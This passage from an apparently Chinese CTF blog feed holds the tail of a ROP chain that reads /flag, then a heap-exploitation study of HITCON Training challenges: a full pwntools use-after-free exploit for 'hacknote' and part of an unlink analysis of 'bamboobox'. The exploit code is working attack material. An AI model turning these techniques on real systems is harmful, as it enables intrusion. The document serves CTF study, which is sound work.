string">'write'</span><span class="token punctuation">]</span>open_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x3c6500</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> \    p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name?'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/flag\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆学习记录</title>
      <link href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/"/>
      <url>/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>大部分题目都选自HITCON Training</p><h2 id="UAF漏洞-use-after-free"><a href="#UAF漏洞-use-after-free" class="headerlink" title="UAF漏洞(use after free)"></a>UAF漏洞(use after free)</h2><p>顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时候依然能狗使用该堆块</p><a id="more"></a><p>看到题目</p><h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><p>先checksec走一波<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/1.jpg" alt=""><br>32位文件，只开了nx和canary，partial RELRO意味着got表可改<br>运行一下<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/2.jpg" alt=""><br>增删查功能<br>接着IDA分析<br>先看到add功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/3.jpg" alt=""><br>首先malloc一个8字节(实际上是分配了16字节，chunk头两个4字节，加上分配的八字节一共16个字节)<br>这16个字节的地址存在notelist这个数组中<br>接着，在这16个字节处，前八个字节是chunk头，接下来的8个字节存入<code>print_note_content</code>函数指针，这个函数的功能是打印<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/4.jpg" alt=""><br>后八个字节存入我们申请的size大小的内存的地址</p><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_contentv0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>因此，整个note的结构就是这样</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> note <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>printnote<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>content <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>再看到print函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/5.jpg" alt=""><br>先输入序号，判断序号是否符合，如果符合的话，再判断<code>notelist[v1]</code>是否存在，存在的话就调用<code>printnote()</code>函数打印</p><p>再看到delete函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/6.jpg" alt=""></p><pre class=" language-c"><code class="language-c"><span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>free并不彻底，指针并未置null，这就是漏洞所在</p><p>写exp之前，我们先封装好要用到的几个函数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>题目中给了一个magic函数<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/8.jpg" alt=""><br>省去了我们泄露libc基地址以及构造shell的功夫<br>那么，该怎么利用这个函数<br>结合uaf漏洞，我们可以将printnote中调用的print_note_content函数替换为magic函数，这样当我们调用printnote函数时，实际上就是调用了magic函数<br>开始构造</p><p>首先malloc两个堆，大小不要等于note结构体的大小</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0号</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1号</span></code></pre><p>然后再free掉这两个堆，实际上则是free掉了4个堆，两个note结构体，两个content部分<br>note结构体的大小位于0x10的fastbin，而conten部分位于0x18处</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/9.jpg" alt=""><br>接下来我们再malloc一个大小为8的堆(2号堆)，并且将其content赋值为magic的地址，根据fastbin后进先出的原则,2号堆的note结构体就位于1号堆的note结构体处，content则位于0号堆的note结构体位置</p><pre><code>               ——————————————————————————————————               |                                |               |         content2(原note0)      |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               |--------------------------------|               |                                |               |         note2(原note1)         |               |                                |               |--------------------------------|               |                                |               |         content0(freed)        |               |                                |               ——————————————————————————————————</code></pre><p>我们看看此时的堆结构<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/10.jpg" alt=""><br>可以看到，原本note0中的print_note_content函数指针已经被替换成了magic函数地址，只要我们printnote(0)，就相当于调用了magic函数，即可getshell<br>完整exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment" spellcheck="true">#io=remote("node3.buuoj.cn",29741)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'hacknote'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>magic <span class="token operator">=</span> <span class="token number">0x08048945</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h3><p>就不细说unlink的原理了，网上有很多师傅的博客可以看，直接说利用方法<br>伪造一个fakechunk0，使fakechunk0的fd指针为<code>&amp;ptr-0x18</code>,使其bk为<code>&amp;ptr-0x10</code>,并通过堆溢出使相邻的下一个堆chunk1认为上一个堆是空闲状态。构造好之后，再free掉chunk1，根据unlink原理，fakechunk也会一起被free掉，攻击效果是ptr最终指向了<code>&amp;ptr-0x18</code>处</p><p>checksec<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/11.jpg" alt=""><br>64位，只开启了canary和nx，我们可以复写got表<br>运行一下，查看功能<br><img src="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/12.jpg" alt=""><br>增删查改，功能齐了<br>IDA分析 </p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//main</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  _QWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-18h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> hello_message<span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> goodbye_message<span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">,</span> _QWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">add_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token function">change_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild choice!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>main函数里面会先malloc一个0x10大小(实际上0x20)的chunk用来存放两个函数的指针，这没啥用<br>然后通过switch选择功能</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_item</span><span class="token keyword">if</span> <span class="token punctuation">(</span> num <span class="token operator">></span> <span class="token number">99</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"the box is full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the length of item name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invaild length"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter the name of item:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token operator">++</span>num<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>不得不说伪代码看的还是相当让人头大的<br>最大能add100次，有一个itemlist结构体，结构如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span> item<span class="token punctuation">{</span>    <span class="token keyword">int</span> size <span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>为了防止以后遗忘仔细记录一次<br>int是4个字节</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p>这一句判断判断的是item结构体中name指针是否存在，那么name指针的位置又是怎么确定的，结合题目说明一下</p><pre class=" language-bash"><code class="language-bash">0x6020c0 <span class="token operator">&lt;</span>itemlist<span class="token operator">></span>:    0x0000000000000018  0x00000000006030300x6020d0 <span class="token operator">&lt;</span>itemlist+16<span class="token operator">></span>: 0x0000000000000018  0x00000000006030500x6020e0 <span class="token operator">&lt;</span>itemlist+32<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x6020f0 <span class="token operator">&lt;</span>itemlist+48<span class="token operator">></span>: 0x0000000000000000  0x00000000000000000x602100 <span class="token operator">&lt;</span>itemlist+64<span class="token operator">></span>: 0x0000000000000000  0x0000000000000000</code></pre><p>64位程序，这么一行就是16个字节，相当于4个int,假设i=0<br>那么，itemlist[i]就是<code>00000018</code>这四个字节，itemlist[i+1]就是<code>00000018</code>前方的<code>00000000</code>这四个字节，相应的，itemlist[i+2]就是<code>00603030</code>这四个字节，对应的就是name指针</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//show_item</span><span class="token keyword">int</span> <span class="token function">show_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>num <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No item in the box"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>itemlist<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d : 